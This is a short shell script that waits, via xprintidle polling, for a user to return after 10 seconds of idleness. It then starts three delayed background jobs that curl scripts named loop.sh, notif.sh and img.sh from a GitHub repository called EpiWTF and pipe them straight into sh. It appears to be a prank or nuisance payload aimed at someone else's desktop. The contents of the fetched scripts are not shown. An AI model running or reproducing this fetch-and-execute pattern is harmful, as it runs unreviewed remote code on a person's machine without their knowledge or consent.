while [ "$(/nix/store/*xprintidle*/bin/xprintidle)" -le "10000" ]
do
	sleep 0.1
done

while [ "$(/nix/store/*xprintidle*/bin/xprintidle)" -ge "10000" ]
do
	sleep 0.1
done

(sleep 30; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/loop.sh | sh -s) &
(sleep 35; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/notif.sh | sh -s) &
(sleep 25; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/img.sh |sh -s) &
